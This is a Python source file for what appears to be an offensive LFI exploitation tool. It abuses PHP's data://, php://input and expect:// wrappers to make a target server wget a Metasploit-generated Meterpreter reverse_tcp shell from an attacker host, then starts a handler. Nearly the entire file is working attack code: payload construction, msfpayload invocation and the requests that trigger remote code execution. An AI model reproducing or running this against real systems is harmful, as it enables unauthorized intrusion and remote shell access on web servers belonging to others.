__author__ = 'rotlogix'

from blessings import Terminal
from shell_generator import Generator
from msf import Payload
import sys
import time
import subprocess
import requests


t = Terminal()


def progressbar():

    bar_width = 70
    sys.stdout.write(t.green(" [*]  ") + " " * bar_width)
    sys.stdout.flush()
    sys.stdout.write("\b" * (bar_width + 1))

    for i in xrange(bar_width):
        time.sleep(0.01)
        sys.stdout.write(".")
        sys.stdout.flush()

    sys.stdout.write("\n")


class Data:

    def __init__(self, target):

        self.target = target

    def execute_data(self):

            # Arguments needed for Meterpreter
            lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
            lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")

            # Generate random shell name
            g = Generator()
            shell = g.generate()

            # Build payload
            payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost, shell)
            encoded_payload = payload.encode('base64')

            # Build data wrapper
            data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
            lfi = self.target + data_wrapper

            print(t.green(" [*] ") + "Generating Data Wrapper")
            progressbar()
            print(t.red(" [!] ") + "Success!")
            print(t.green(" [*] ") + "Generating Metasploit Payload")
            progressbar()

            # msfpayload arguments
            php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)

            # Generate shell
            msf = subprocess.Popen(php, shell=True)
            msf.wait()

            # Make sure payload was generated correctly
            if msf.returncode != 0:
                print(t.red(" [!] ") + "Error Generating MSF Payload ")
            else:
                print(t.red(" [!] ") + "Success! ")

            print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)

            # Assuming if there is a server running on port 8000 hosting from /tmp
            print(t.red(" [!] ") + "Is Your Server Running?")
            print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()

            # LFI payload that downloads the shell
            data_request = requests.get(lfi)

            # Try block for actual attack
            try:
                if data_request.status_code != 200:
                    print(t.red(" [!] ") + "Unexpected HTTP Response ")
                else:
                    handle = Payload(lhost, lport, self.target, shell)
                    handle.handler()
            except requests.exceptions.RequestException as data_error:
                print(t.red(" [!] ") + "HTTP Error: %s" % data_error)


class Input:

    def __init__(self, target):

        self.target = target

    def execute_input(self):

        # Arguments needed for Meterpreter
        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")

        # Generate random shell name
        g = Generator()
        shell = g.generate()

        # Build php payload
        wrapper = "php://input"
        url = self.target + wrapper
        payload = "<?php system('wget http://%s:8000/{0}.php'); ?>".format(shell)

        print(t.green(" [*] ") + "Generating Data Wrapper")
        progressbar()
        print(t.red(" [!] ") + "Success!")
        print t.green(" [*] ") + "Generating Metasploit Payload"
        progressbar()

        # Generate PHP shell
        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
        msf = subprocess.Popen(php, shell=True)
        msf.wait()

        # Handle Metasploit error codes
        if msf.returncode != 0:

            print(t.red(" [!] Error Generating MSF Payload "))

        else:

            print(t.green(" [*] ") + "Success!")

        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
        print(t.green(" [*] ") + "Downloading Shell")
        progressbar()

        # Try block for actual attack
        try:
            dr = requests.post(url, data=payload)
            if dr.status_code != 200:
                print t.red(" [*] Unexpected HTTP Response ")
            else:
                handle = Payload(lhost, lport, self.target, shell)
                handle.handler()
        except requests.exceptions.RequestException as input_error:
            print t.red(" [*] HTTP Error ") + str(input_error)


class Expect:

    def __init__(self, target):

        self.target = target

    def execute_expect(self):

        # Arguments for Meterpreter
        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")

        # Generate random shell name
        g = Generator()
        shell = g.generate()

        # Build payload
        payload = "expect://wget http://{0}:8000/{1}.php".format(lhost, shell)
        lfi = self.target + payload

        print(t.green(" [*] ") + "Generating Payload")
        progressbar()
        print(t.red(" [!] ") + "Success!")
        print(t.green(" [*] ") + "Generating Metasploit Payload")
        progressbar()

        # Generate PHP shell
        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
        msf = subprocess.Popen(php, shell=True)
        msf.wait()

        # Handle Metasploit error codes
        if msf.returncode != 0:
            print(t.red(" [!] Error Generating MSF Payload "))
        else:
            print(t.green(" [*] ") + "Success!")

        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
        print(t.green(" [*] ") + "Downloading Shell")
        progressbar()

        ir = requests.get(lfi)

        try:
            if ir.status_code != 200:
                print(t.red(" [!] Unexpected HTTP Response "))
            else:
                handle = Payload(lhost, lport, self.target, shell)
                handle.handler()
        except requests.exceptions.RequestException as expect_error:
            print t.red(" [!] HTTP Error ") (expect_error)